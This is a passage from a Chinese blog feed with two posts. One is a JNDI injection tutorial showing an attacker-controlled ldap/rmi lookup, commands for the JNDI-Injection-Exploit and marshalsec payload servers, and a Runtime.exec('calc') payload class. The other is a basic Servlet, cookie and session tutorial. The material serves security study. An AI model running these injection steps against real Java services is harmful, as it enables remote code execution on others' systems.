        <content type="html"><![CDATA[<h1 id="Java-JNDI"><a href="#Java-JNDI" class="headerlink" title="Java-JNDI"></a>Java-JNDI</h1><h2 id="JNDI-是什么"><a href="#JNDI-是什么" class="headerlink" title="JNDI 是什么"></a>JNDI 是什么</h2><p>JNDI（Java Naming and Directory Interface）是一个应用程序设计的 API，一种标准的 Java 命名系统接口。</p><p>JNDI 提供统一的客户端 API，通过不同的 JNDI 服务供应接口（SPI）的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。</p><p>通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的命令服务和目录服务，如下图。</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png"></p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>LDAP</td><td>轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</td></tr><tr><td>RMI</td><td>JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</td></tr><tr><td>DNS</td><td>域名服务</td></tr><tr><td>CORBA</td><td>公共对象请求代理体系结构</td></tr></tbody></table><h2 id="JNDI-注入原理分析"><a href="#JNDI-注入原理分析" class="headerlink" title="JNDI 注入原理分析"></a>JNDI 注入原理分析</h2><p>JNDI 注入，即当开发者在定义 JNDI 接口初始化时，lookup() 方法的参数被外部攻击者可控，攻击者就可以将恶意的 url 传入参数，以此劫持被攻击的 Java 客户端的 JNDI 请求指向恶意的服务器地址，恶意的资源服务器地址响应了一个恶意 Java 对象载荷（reference 实例 or 序列化实例），对象在被解析实例化，实例化的过程造成了注入攻击。不同的注入方法区别主要就在于利用实例化注入的方式不同。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>;    <span class="comment">// 指定查找的 uri 变量</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">// 得到初始目录环境的一个引用</span></span><br><span class="line">        initialContext.lookup(uri); <span class="comment">// 获取指定的远程对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中定义了 uri 变量，uri 变量可控，并定义了一个 rmi 协议服务， rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Exploit 为攻击者控制的链接，最后使用 lookup () 函数进行远程获取 Exploit 类（Exploit 类名为攻击者定义，不唯一），并执行它。</p><p><strong>JNDI 远程调用：JNDI-Injection</strong></p><p>1，使用远程调用（默认端口 1389）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://xx.xx.xx.xx:1389/Test&quot;</span>);</span><br></pre></td></tr></table></figure><p>2，利用工具生成调用地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;calc&quot;</span> -A xx.xx.xx.xx</span><br></pre></td></tr></table></figure><p><strong>JNDI 远程调用 - marshalsec</strong></p><p>2，利用工具生成调用地址</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;calc&quot;</span> -A xx.xx.xx.xx</span><br></pre></td></tr></table></figure><p><strong>JNDI 远程调用 - marshalsec</strong></p><p>1，使用远程端口 (默认端口 1389)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InitialContext</span>().lookup(<span class="string">&quot;ldap://xx.xx.xx.xx:1389/Test&quot;</span>);</span><br></pre></td></tr></table></figure><p>2，编译对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java  <span class="comment">//编译为.class</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Test.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calculator</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3，使用工具生成调用协议（rmi，ldap）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LADPRefServeer http:<span class="comment">//0.0.0.0/Test</span></span><br><span class="line">或者</span><br><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServeer http:<span class="comment">//0.0.0.0/Test</span></span><br></pre></td></tr></table></figure><p>注意：不同 JDK 版本中 JNDI 注入存在的限制及绕过方法</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5-1024x365.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaEE应用-Servlet</title>
      <link href="/2025/06/17/JavaEE%E5%BA%94%E7%94%A8-Servlet/"/>
      <url>/2025/06/17/JavaEE%E5%BA%94%E7%94%A8-Servlet/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaEE应用-Servlet"><a href="#JavaEE应用-Servlet" class="headerlink" title="JavaEE应用-Servlet"></a>JavaEE应用-Servlet</h1><h2 id="JavaEE-基础"><a href="#JavaEE-基础" class="headerlink" title="JavaEE 基础"></a>JavaEE 基础</h2><h3 id="一：Servlet-实现"><a href="#一：Servlet-实现" class="headerlink" title="一：Servlet 实现"></a>一：Servlet 实现</h3><p>继承抽象类 HttpServlet 的重写部分方法（常用）</p><p>添加注解 @WebServlet(“&#x2F;LoginServlet”)</p><blockquote><p>servlet3.0 引入了 @WebServlet,@WebFilter 等注解，可以代替在 web.xml 中通过 <servlet><filter > 等标签进行配置 , 从而可以摆脱掉 web.xml，@WebServlet(“&#x2F;LoginServlet”)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">创建 Indexservlet 的类</span><br><span class="line">    <span class="keyword">package</span> com.example.demo2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line">    <span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line">    <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * servlet实现</span></span><br><span class="line"><span class="comment">    * 1，创建Class类</span></span><br><span class="line"><span class="comment">    * 2，继承HttpServlet类</span></span><br><span class="line"><span class="comment">    * 3，重写Service()方法(Service方法在Servelt类被访问时自动调用，作用：接受请求，响应结果)</span></span><br><span class="line"><span class="comment">    * 4，在Servlet中添加注解，设置资源对位访问路径，浏览器通过访问路径，访问到Servlet类</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@WebServlet(&quot;/ser01&quot;)</span> <span class="comment">//添加注解，访问路径</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Indexservlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello,Indexservlet&quot;</span>);  <span class="comment">//输出在控制台</span></span><br><span class="line">            <span class="comment">//响应数据</span></span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Hello,Index&quot;</span>);  <span class="comment">//输出到客户端</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="二：Servlet-的工作流程与生命周期"><a href="#二：Servlet-的工作流程与生命周期" class="headerlink" title="二：Servlet 的工作流程与生命周期"></a>二：Servlet 的工作流程与生命周期</h3><p>Servlet 的生命周期可以分为四个阶段，即装载类及创建实例阶段、初始化阶段、服务阶段和实例销毁阶段。</p><ul><li>1、初始化阶段  调用 init () 方法</li><li>2、响应客户请求阶段。调用 service () 方法，由 service () 方法根据提交的方式选择执行 doGet () 或者 doPost () 方法</li><li>3、终止阶段　　调用 destroy () 方法</li></ul><p>工作流程：</p><ul><li>通过请求头获知浏览器访问的是哪个主机</li><li>在通过请求行获取访问的是哪个 web 应用</li><li>再通过请求行中的请求路径获知访问的是哪个资源</li><li>通过获取的资源路径在配置中匹配到真实路径</li><li>服务器会创建 servlet 对象，（如果第一次访问时，创建 - servlet 实例，并调用 init 方法进行初始化操作）</li><li>调用 service（request，response）方法来处理请求和响应的操作</li><li>调用 service 完毕后返回服务器 由服务器将 response 缓冲区的数据取出</li></ul><h3 id="三，HttpServleRequest-对象"><a href="#三，HttpServleRequest-对象" class="headerlink" title="三，HttpServleRequest 对象"></a>三，HttpServleRequest 对象</h3><p> 作用：主要用来接受客户端发送过来的请求信息。例如：请求的参数，发送的头信息等都属于客户端发来的信息，service () 方法中的形参接受的是 HttpServletRequest 接口的实例化对象，表示对象主要运用在 HTTP 协议上，该对象有 Tomcat 封装好传递过来</p><p><strong>接受请求：</strong></p><p>常用方法：</p><p>getRequestURL ()：获取客户端发出请求时的完整 URL</p><p>getRequestURL ()：获取请求行中的资源名称部分（项目名称开始）</p><p>getQueryString ()：获取请求行中的参数部分</p><p>getMethod ()：获取客户端的请求方式</p><p>getProtocol ()：获取 HTTP 版本号</p><p>getContextPath ()：获取 webapp 名字（站点名）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> req.getRequestURL().toString();</span><br><span class="line">System.out.println(<span class="string">&quot;获取客户端请求的完整URL &quot;</span>+url);</span><br><span class="line"><span class="comment">//获取客户端请求的完整URL （从http 开始，到？前面结束）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> req.getRequestURI();</span><br><span class="line">System.out.println(<span class="string">&quot;获取客户端请求的完整URi &quot;</span>+uri);</span><br><span class="line"><span class="comment">//获取请求中的参数部分</span></span><br><span class="line">String queryString=req.getQueryString();</span><br><span class="line">System.out.println(<span class="string">&quot;获取请求中的参数部分:&quot;</span>+queryString);</span><br><span class="line"><span class="comment">//获取客户端的请求方式</span></span><br><span class="line"><span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> req.getMethod();</span><br><span class="line">System.out.println(<span class="string">&quot;获取客户端的请求方式:&quot;</span>+method);</span><br><span class="line"><span class="comment">//获取HTTP版本号</span></span><br><span class="line">String protocol=req.getProtocol();</span><br><span class="line">System.out.println(<span class="string">&quot;获取HTTP版本号:&quot;</span>+protocol);</span><br><span class="line"><span class="comment">//获取webapp名字（站点名）</span></span><br><span class="line"><span class="type">String</span> <span class="variable">webapp</span> <span class="operator">=</span>req.getContextPath();</span><br><span class="line">System.out.println(<span class="string">&quot;获取webapp名字（站点名）:&quot;</span>+webapp);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">        *获取请求参数</span></span><br><span class="line"><span class="comment">        *   1.通过参数名获取参数值， 返回字符串</span></span><br><span class="line"><span class="comment">        *   req.getParameter(&quot;参数名&quot;);</span></span><br><span class="line"><span class="comment">        *      参数名：</span></span><br><span class="line"><span class="comment">        *         1.表达元素name属性值</span></span><br><span class="line"><span class="comment">        *         2.ajax的data属性值的键</span></span><br><span class="line"><span class="comment">        *         3.超链接参数的键</span></span><br><span class="line"><span class="comment">        *   2.通过参数名获取所有的参数值，返回数组</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        **   */</span></span><br><span class="line">        <span class="comment">//获取用户名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uname</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;unmae&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">upwd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;upwd&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名：&quot;</span>+uname+<span class="string">&quot;密码&quot;</span>+upwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过参数名获取所有的参数值，返回数组</span></span><br><span class="line">        String[] hobby =req.getParameterValues(<span class="string">&quot;hobby&quot;</span>);</span><br><span class="line">        System.out.println(hobby.length);</span><br></pre></td></tr></table></figure><p><strong>请求转发：</strong></p><p>请求转发，是一种服务器的行为，当客户端请求达到后，服务器进行准发，此时会将请求对象进行保存，地址栏中的 URL 地址不会改变，得到响应后，服务端在响应发送给客户端，从始至终只有一个请求发出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.getRequestDispatcher(url).forward(request.response);</span><br></pre></td></tr></table></figure><p><strong>Request 作用域</strong></p><p>通过该对象可以在一个请求中传递数据，作用范围：在一次请求中有效，即服务跳转有效</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置域对象内容</span></span><br><span class="line">request.setAttribute(String name,String value);</span><br><span class="line"><span class="comment">//获取域对象内容</span></span><br><span class="line">request.getAttrbute(String name);</span><br><span class="line"><span class="comment">//删除域对象内容</span></span><br><span class="line">request.removeAttrbute(String name);</span><br></pre></td></tr></table></figure><p>request 域对象中的数据在一次请求中有效，则经过请求转发，request 域中的数据依然存在，则在请求转发的过程中可以通过 request 来传输 &#x2F; 共享数据</p><p><strong>响应数据</strong><br>接收到客户端请求后，可以通过 HttpServletResponse 对象直接进行响应，响应时需要获取输出流。<br>有两种形式:<br>getWriter() 获取字符流 (只能响应回字符)<br>getOutputStream() 获取字节流 (能响应一切数据)</p><p><strong>重定向</strong></p><p>重定向是一种服务器指导，客户端的行为。客户端发出第一个请求，被服务器接收处理后，服务器会进行响应，在响应的同时，服务器会给客户端一个新的地址，当客户端接收到响应后，会立刻、马上、自动根据服务器给的新地址发起二个请求，服务器接收请求并作出响应，重定向完成。</p><pre><code>resp.sendRedirect(&quot;url&quot;);</code></pre><p>请求转发与重定向的区别</p><ul><li><ol><li>请求转发的地址栏不发生改变，重定向的地址会被改变</li></ol></li><li><ol start="2"><li>请求转发是服务端跳转，重定向是客户端跳转</li></ol></li><li><ol start="3"><li>请求转发是一次请求，重定向是两次请求</li></ol></li><li><ol start="4"><li>请求转发是 request 作用域可以共享，重定向是不可以共享</li></ol></li><li><ol start="5"><li>请求转发的地址是跳转到当前项目的资源，重定向可<br>  跳转到任意资源</li></ol></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/ser03&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servlet03</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;yes.....&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    System.out.println(<span class="string">&quot;servlet...&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//请求转发(服务端)</span></span><br><span class="line"><span class="comment">//        req.getRequestDispatcher(&quot;index.jsp&quot;).forward(req,resp);</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//重定向 跳转到首页（服务端）</span></span><br><span class="line">                    resp.sendRedirect(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">                    <span class="comment">//跳转到百度</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Cookie 对象</strong><br>通过 new Cookie (“key” “value”); 来创建一个 Cookie 对象，要想将 Cookie 随响应发送到客户端，需要先添加到 response 对象中，response.addCookie (cookie); 此时该 cookie 对象则随着响应发送至了客户端。在浏览器上可以看见</p><p><strong>cookie 获取</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//响应cookie对象</span></span><br><span class="line">resp.addCookie(cookie);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.shsxt.servlet.Cookie;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Cookie</span></span><br><span class="line"><span class="comment">*     是浏览器技术</span></span><br><span class="line"><span class="comment">* Cookie对象的创建与发送</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/cook01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cookie01</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到Cookie对象</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//响应cookie对象</span></span><br><span class="line">        resp.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-6.png"></p><p><strong>Cookie 的路径</strong></p><pre><code>Cookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。        // 1.当前服务器下，任务项目的任意资源，都可获取Cookie对象        Cookie cookie01=new Cookie(&quot;aa&quot;,&quot;AA&quot;);        cookie01.setPath(&quot;/&quot;);        resp.addCookie(cookie01);//      2.在当前项目下，可以获取cookie对象（默认）        Cookie cookie02=new Cookie(&quot;bb&quot;,&quot;BB&quot;);        cookie02.setPath(&quot;/zhongsheng&quot;);        resp.addCookie(cookie02);//        3.在指定项目下，可获取cookie对象（指定项目站点名：/s05）        Cookie cookie03=new Cookie(&quot;cc&quot;,&quot;CC&quot;);        cookie03.setPath(&quot;/ser05&quot;);        resp.addCookie(cookie03);//        4.在指定项目的指定资源下，以获取cookie对象        Cookie cookie04=new Cookie(&quot;dd&quot;,&quot;DD&quot;);        cookie04.setPath(&quot;/zhongsheng/test&quot;);        resp.addCookie(cookie04);</code></pre><p>Cookie 的 setPath 设置 cookie 的路径，这个路径直接决定服务器的请求是否会从浏览器中加载某些 cookie。<br>*<br>当前项目：站点名为：&#x2F;zhongsheng<br>当前服务域名为：localhost:8080<br>设置路径：setpath (), 默认当前项目的站点名<br>setPath(“&#x2F;zhongsheng”)<br>*</p><ul><li><ol><li>当前服务器下，任务项目的任意资源，都可获取 Cookie 对象</li></ol></li><li>serpath(“&#x2F;”);</li><li><ol start="2"><li>在当前项目下，可以获取 cookie 对象（默认）</li></ol></li><li>setPath（“&#x2F;zhongsheng”）</li><li><ol start="3"><li>在指定项目下，可获取 cookie 对象（指定项目站点名：&#x2F;s05）</li></ol></li><li>setPath（“&#x2F;s05”）</li><li><ol start="4"><li>在指定项目的指定资源下，以获取 cookie 对象<br>setPath（“&#x2F;zhongsheng&#x2F;ser12”）;</li></ol></li></ul><p><strong>HttpSesion 对象</strong></p><p>对于服务器而言，每一个连接到它的客户端都是一个 session，servlet 容器使用此接口创建 HTTP 客户端和 HTTP 服务器之间的会话。会话将保留指定的时间段，跨多个连接或来自用户的页面请求。一个会话通常对应于一个用户，该用户可能多次访问一个站点。可以通过此接口查看和操作有关某个会话的信息，比如会话标识符、创建时间和最后一次访问时间。在整个 session 中，最重要的就是属性的操作。</p><p>session 无论客户端还是服务器端都可以感知到，若重新打开一个新的浏览器，则无法取得之前设置的 session，因为每一个 session 只保存在当前的浏览器当中，并在相关的页面取得。</p><p>Session 的作用就是为了标识一次会话，或者说确认一个用户；并且在一次会话（一个用户的多次请求）期间共享数据。我们可以通过 request.getSession () 方法，来获取当前会话的 session 对象。</p><pre><code>//创建获取SessionHttpSession session =req.getSession();//设置sessiony</code></pre><p><strong>标识符 JSESSIONID</strong></p><p>Session 既然是为了标识一次会话，那么此次会话就应该有一个唯一的标志，这个标志就是 sessionld。</p><p>每当一次请求到达服务器，如果开启了会话 (访问了 session)，服务器第一步会查看是否从客户端回传一个名为 JSESSIONID 的 cookie，如果没有则认为这是一次新的会话，会创建一个新的 session 对象，并用唯一的 sessionld 为此次会话做一个标志。如果有 JESSIONID 这个 cookie 回传，服务器则会根据 JSESSIONID 这个值去查看是否含有 id 为 JSESSION 值的 session 对象，如果没有则认为是一个新的会话，重新创建一个新的 session 对象，并标志此次会话；如果找到了相应的 session 对象，则认为是之前标志过的一次会话共享。</p><p>这里提到一个叫做 JSESSIONID 的 cookie，这是一个比较特殊的 cookie，当用户请求服务器时，如果访问了 session，则服务器会创建一个名为 JSESSIONID，值为获取到的 session (无论是获取到的还是新创建的) 的 sessionld 的 cookie 对象，并添加到 response 对象中，响应给客户端，有效时间为关闭浏览器。</p><p>所以 Session 的底层依赖 Cookie 来实现。</p><pre><code>package com.shsxt.servlet.Session;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.IOException;/*** Session的作用域**    再一次会话中有效*    通过setAttribute(name , value)方法向域对象中添加数据*    通过getAttribute(name)从域对象中获取数据*    通过removeArribute（name）从域对象移除数据**    request作用域*       知在一次请求有效*       只在请求转发跳转有效*    session作用域：*        在一次会话中有效，会话中包含多次请求*        在请求转发与重定向跳转后都有效*        **/@WebServlet(&quot;/ses02&quot;)public class Session02 extends HttpServlet &#123;    @Override    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;        //创建获取Session        HttpSession session =req.getSession();        System.out.println(&quot;session02&quot;+session.getId());        //request作用域        req.setAttribute(&quot;requestMsg&quot;,&quot;request的作用域&quot;);        //session作用域        session.setAttribute(&quot;sessionMsg&quot;,&quot;session的作用域&quot;);        //请求转发//        req.getRequestDispatcher(&quot;index.jsp&quot;).forward(req,resp);        //重定向        resp.sendRedirect(&quot;index.jsp&quot;);    